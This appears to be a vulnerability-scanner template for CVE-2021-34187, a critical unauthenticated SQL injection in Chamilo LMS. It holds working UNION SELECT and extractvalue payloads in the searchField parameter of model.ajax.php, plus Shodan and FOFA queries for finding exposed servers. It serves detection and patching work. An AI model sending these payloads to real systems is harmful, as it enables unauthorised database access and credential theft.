http:
- matchers:
  - part: body
    type: word
    words:
    - '{{md5({{num}})}}'
  - part: content_type
    type: word
    words:
    - application/json
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/main/inc/ajax/model.ajax.php?a=get_sessions_tracking&work_id=1&rows=0&page=1&sidx=0&sord=test&_search=1&searchField=1))and(1)%20UNION%20ALL%20SELECT%20CONCAT((select+md5({{num}}))),NULL,NULL,NULL--%20-)and((1=&searchOper=ni&searchString=testx&filters2={}&from_course_session=0'
  - '{{BaseURL}}/main/inc/ajax/model.ajax.php?a=get_sessions_tracking&work_id=1&rows=0&page=1&sidx=0&sord=test&_search=1&searchField=1))and(1)%20UNION%20ALL%20SELECT%20CONCAT((select+extractvalue(0x0a,concat(0x0a,(md5({{num}})))))),NULL,NULL,NULL--%20-)and((1=&searchOper=ni&searchString=testx&filters2={}&from_course_session=0'
  - '{{BaseURL}}/main/inc/ajax/model.ajax.php?a=get_sessions_tracking&work_id=1&rows=0&page=1&sidx=0&sord=test&_search=1&searchField=1))and(1)%20UNION%20ALL%20SELECT%20CONCAT((select+md5({{num}}))),NULL,NULL,NULL--%20-)and((1=&searchOper=ni&searchString=testx&filters2={}&from_course_session=0'
  - '{{BaseURL}}/main/inc/ajax/model.ajax.php?a=get_sessions_tracking&work_id=1&rows=0&page=1&sidx=0&sord=test&_search=1&searchField=1))and(1)%20UNION%20ALL%20SELECT%20CONCAT((select+extractvalue(0x0a,concat(0x0a,(md5({{num}})))))),NULL,NULL,NULL--%20-)and((1=&searchOper=ni&searchString=testx&filters2={}&from_course_session=0'
  stop-at-first-match: true
id: CVE-2021-34187
info:
  author: DhiyaneshDK
  classification:
    cpe: cpe:2.3:a:chamilo:chamilo:*:*:*:*:*:*:*:*
    cve-id: CVE-2021-34187
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-89
    epss-percentile: 0.99594
    epss-score: 0.90712
  description: 'main/inc/ajax/model.ajax.php in Chamilo through 1.11.14 allows SQL
    Injection via the searchField, filters, or filters2 parameter.

    '
  impact: 'Unauthenticated attackers can exploit SQL injection via multiple parameters
    to extract database contents, potentially exposing all Chamilo LMS data including
    user credentials.

    '
  metadata:
    fofa-query: 'banner="X-Powered-By: Chamilo"'
    max-request: 1
    product: chamilo
    shodan-query: 'X-Powered-By: Chamilo'
    vendor: chamilo
    verified: true
  name: Chamilo model.ajax.php - SQL Injection
  reference:
  - https://murat.one/?p=118
  - https://nvd.nist.gov/vuln/detail/CVE-2021-34187
  remediation: 'Upgrade to Chamilo version 1.11.15 or later.

    '
  severity: critical
  tags: cve,cve2021,chamilo,sqli,vkev,vuln
variables:
  num: '999999999'
